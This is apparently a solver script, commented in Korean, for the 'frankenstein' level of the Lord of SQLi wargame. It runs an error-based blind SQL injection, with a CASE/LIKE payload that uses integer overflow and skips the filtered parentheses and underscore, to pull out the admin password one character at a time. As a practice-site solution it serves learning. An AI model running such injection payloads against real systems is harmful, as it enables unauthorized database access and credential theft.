import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = {'PHPSESSID': session_id}
# ascii 코드만큼만 비밀번호 확인에 사용, 필터링되는 _는 제외
ascii_list = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@-`?$^!"


# 비밀번호 탐색 함수
def find_pw():
    pw = str()
    # 비밀번호 길이를 모르니 계속 쿼리를 수행하도록 무한 반복 수행
    while 1:
        # 이번 루프(1글자 찾기)에서 문자를 찾았는지 기록하는 플래그
        found_char = False

        # like 구문을 사용해 찾은 문자열부터 뒤에 ascii 문자열을 붙여 오류 유발 확인
        for ascii in ascii_list:
            # 괄호(함수) 없이 에러 유발 방법으로 9e307*2과 ~0+1 등이 있음
            # - 9e307*2: mysql의 표현 범위가 9e307까지만 가능
            # - ~0+1: 정수 범위 overflow 유발
            payload = "'or id='admin' and case when pw like '{}{}%' then 1 else ~0+1 end #".format(pw, ascii)
            params = {"pw": payload}
            res = requests.get(url, params=params, cookies=cookies)
            if '<br>error' not in res.text:
                print(f"pw의 {len(pw) + 1}번째 값: {ascii}")
                pw += ascii
                found_char = True
                break   # ascii_list 반복문 탈출 → 다음 글자 탐색하러 감

        # ascii_list를 전부 순회했는데도 break가 없었다면(found_char == False)
        # 더 이상 맞는 문자가 없으므로 비밀번호를 전부 찾았다고 판단
        if not found_char:
            break

    return pw


pw = find_pw()
print(f"completed pw: {pw}")
